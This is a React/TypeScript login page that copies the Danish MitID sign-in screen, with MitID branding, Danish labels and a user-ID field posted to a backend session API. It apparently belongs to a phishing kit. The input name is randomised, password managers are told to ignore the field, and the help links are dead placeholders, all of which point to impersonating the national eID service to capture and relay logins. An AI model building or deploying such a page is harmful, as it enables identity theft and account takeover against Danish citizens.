import { useState } from 'react'
import BrandLogo from '../components/BrandLogo'
import MitIdLogo from '../components/MitIdLogo'
import HelpIcon from '../components/HelpIcon'
import ArrowIcon from '../components/ArrowIcon'
import SidePanel from '../components/SidePanel'
import { api } from '../services/api'

interface Props {
  onSessionCreated: (sessionId: string, userId: string) => void
}

export default function LoginPage({ onSessionCreated }: Props) {
  const [userId, setUserId] = useState('')
  const [showUserId, setShowUserId] = useState(true)
  const [remember, setRemember] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!userId.trim()) return
    setLoading(true)
    setError('')
    try {
      const { sessionId } = await api.initSession(userId)
      onSessionCreated(sessionId, userId)
    } catch {
      setError('Forbindelsen mislykkedes. Prøv igen.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ background: '#fff', fontFamily: '"IBM Plex Sans", Arial, Helvetica, FreeSans, sans-serif', lineHeight: '1.5rem', fontSize: '1rem', color: '#333' }}>
      <header className="hidden sm:flex bg-white h-[50px] items-center px-6 border-b border-gray-200">
        <BrandLogo />
      </header>
      <main className="flex-1 flex items-start justify-center sm:mt-[26px] mt-0 px-4 sm:px-6">
        <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full items-center lg:items-start">
          <div style={{ width: 400, minHeight: '24.8rem', height: 588, boxSizing: 'content-box' }} className="mx-auto lg:mx-0">
            <form onSubmit={handleSubmit} style={{ width: '100%', display: 'flex', flexDirection: 'column', boxSizing: 'content-box' }} className="px-6 py-5">
              <div className="flex items-start justify-between">
                <h1 className="text-[17px] font-bold leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                <MitIdLogo />
              </div>
              <hr style={{ borderTop: '1px solid #ccc' }} className="mt-3 mb-4" />
              <div className="mb-4">
                <div className="flex items-center gap-1.5 mb-2">
                  <label className="text-[14px] font-bold">Bruger-ID</label>
                  <button type="button" className="w-4 h-4 flex items-center justify-center cursor-help" aria-label="Åbn hjælpetekst"><HelpIcon /></button>
                </div>
                <div className="relative">
                  <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                    name={`uid_${Math.random().toString(36).slice(2)}`}
                    className="w-full border border-[#999] rounded-[2px] px-3 py-2.5 text-[14px] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-14" autoComplete="off" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
                  <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[14px] text-[#0055a5] cursor-pointer select-none font-medium" tabIndex={0}>
                    {showUserId ? 'Skjul' : 'Vis'}
                  </div>
                </div>
              </div>
              {error && <div className="text-red-600 text-xs mb-2">{error}</div>}
              <button type="submit" disabled={loading || !userId.trim()}
                className={`w-full font-bold text-[15px] py-3 px-4 rounded-[3px] flex items-center justify-between transition-colors ${
                  userId.trim() && !loading
                    ? 'bg-[#0055a5] hover:bg-[#004080] text-white cursor-pointer'
                    : 'bg-[#e6e6e6] text-[#999] cursor-not-allowed'
                }`}>
                <span className="uppercase">{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
              </button>
              <div className="mt-4 mb-1">
                <a href="#" className="inline-flex items-center gap-2 text-[#0055a5] hover:underline text-[15px] font-bold">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z" fill="#0055a5"/></svg>
                  <span>Glemt bruger-ID?</span>
                </a>
              </div>
              <div className="flex-1" />
              <label className="flex items-center gap-2.5 cursor-pointer mb-3">
                <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="w-[18px] h-[18px] accent-[#0055a5] cursor-pointer shrink-0" />
                <span className="text-[14px] leading-snug">Husk mig hos MitID.dk</span>
              </label>
              <hr style={{ borderTop: '1px solid #ccc' }} className="mb-3" />
              <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
                <a href="#" className="hover:underline">Afbryd</a><a href="#" className="hover:underline">Hjælp</a>
              </nav>
            </form>
          </div>
          <div className="hidden lg:block"><SidePanel /></div>
        </div>
      </main>
    </div>
  )
}
